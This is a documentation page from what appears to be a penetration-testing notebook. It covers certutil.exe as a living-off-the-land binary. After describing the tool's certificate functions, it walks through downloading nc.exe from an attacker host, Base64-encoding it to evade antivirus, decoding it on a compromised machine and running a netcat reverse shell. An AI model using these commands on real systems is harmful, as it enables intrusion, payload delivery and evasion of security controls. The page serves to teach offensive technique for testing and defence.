.. _ref_Certutil:

============
Certutil.exe
============

.. index::
   single: CertUtil
   single: File Transfert; CertUtil

.. contents::
    :depth: 3
    :backlinks: top

####

--------
Certutil
--------

CertUtil.exe is installed as part of Certificate Services and can be used to manage
certificates in Windows.

With certutil you can perform various function related to certificates and certificate stores,
such as displaying certification authority (CA) configuration information, configure
Certificate Services, backup and restore CA components, and verify certificates, key pairs,
and certificate chains.

    .. important:: 
        
        Certutil is also known as a Living Off Land (LOL) binary which is a trusted,
        pre-installed system tool with ‘extra’ unexpected functionality, such as downloading
        files. An interesting feature of certutil is the option to download a remote
        certificate from a remote URL and save it to the local file system. While this feature
        is intended to download certificate files, **it can also be used to download
        non-certificate files with one simple command, including scripts and executables**.
        
It should not come as a surprise that this feature is heavily utilized in campaigns to
download malware which **can even bypass security programs and monitoring by base64 encoding
the malicious file and decoding it after it has been downloaded to the system**.

.. note:: 
    
    **Transferring file with certutil.exe**
    
    .. code:: shell
        :number-lines:
        :force:

            certutil -urlcache -split -f [URL] [Filename.Extension]

    **Options explained**

        * -URLcache: Displays or deletes URL cache entries.
        * -f: Forces fetching a specific URL and updating the cache.
        * -split: Split embedded ASN.1 elements, and save to files on disk.


.. note:: 
    
    **exemple**

    an example where we download a file called nc.exe
    
    .. code:: shell
        :number-lines:
        :force:

            certutil -urlcache -split -f http://[IP] nc.exe

    .. image:: images/certutil1.jpg
        :width: 500 px
        :align: center

    The certutil program confirms that the command completed successfully.

####

-----------------------
Base64-encoded payloads
-----------------------

Another nice feature of CertUtil.exe that may **help to bypass security controls** is the option to
decode Base64-encoded files to the file system.

Using the **-decode** option, we can download a Base64-encoded malicious executable as text file and
decode the executable to disk. This may help in effectively bypassing security controls such as
antivirus, edge devices and filtering.

Let us demonstrate this with an example where we have a Base64-encoded text file of the nc.exe
executable, transfer it to the compromised Windows host, decode it back to an executable and finally
execute it for a reverse shell.

    .. note:: 
        
        The following figure is a diagram of the process:

        .. image:: images/Base64-encoded-payloads-WM.jpg
           :width: 500 px
           :align: center

First, we need to Base64-encode the Netcat executable. The command to Base64-encode files with
CertUtil.exe.

    #. Encode the payload to Base64
        
        .. note:: 
        
            .. code:: shell
               :number-lines:
               :force:

                 certutil.exe -encode [inputFileName] [encodedOutputFileName]

            .. image:: images/certutil_base64encoding_01.jpg
               :width: 500 px
               :align: center

        The output of this command is a text file that contains the Base64-encoded nc.exe binary.
        This text file can be transferred to the comprised target where it will be decoded back to a
        binary on disk.
        
        To verify that the nc.txt file contains text, we can run the following command to print the
        first 10 lines to the terminal:

            .. note:: 
                
                **Title**
                
                .. code:: shell
                    :number-lines:
                    :force:
        
                     powershell -command "Get-Content nc.txt -Head 10"

                .. image:: images/certutil_base64encoding_02.jpg
                   :width: 500 px
                   :align: center

    #. Transfert the file to the target

        The next step is to transfer the text file to the target and decode it back to an executable.

        .. note:: 
            
            .. code:: shell
                :number-lines:
                :force:
    
                 certutil.exe -urlcache -split -f "http://[Attack box IP]/nc.txt" nc.txt

               .. image:: images/certutil_base64encoding_03.jpg
               :width: 500 px
               :align: center

    #. Decode the Base64 file from the compromise target

        .. note:: 
            
            .. code:: shell
                :number-lines:
                :force:
    
                 certutil.exe -decode nc.txt nc.exe
   
            .. image:: images/certutil_base64encoding_04.jpg
               :width: 500 px
               :align: center

        As we can see on the screenshots, the nc.txt file was successfully downloaded to the target
        host and decoded to disk with the last command.

    #. Exploit or virifying Netcat is working

        To verify that we got a working version of Netcat, we can execute this binary to connect
        back to our attack box.

        .. note:: 
            
            Execute the following command on the Windows compromised host to initiate the reverse
            shell to the attack box and connect the cmd.exe program to the shell:
            
            .. code:: shell
                :number-lines:
                :force:
    
                 nc.exe [Attack box IP] 5555 -e cmd.exe

            .. image:: images/certutil_base64encoding_05.jpg
               :width: 500 px
               :align: center

####

--------
Weblinks
--------

.. target-notes::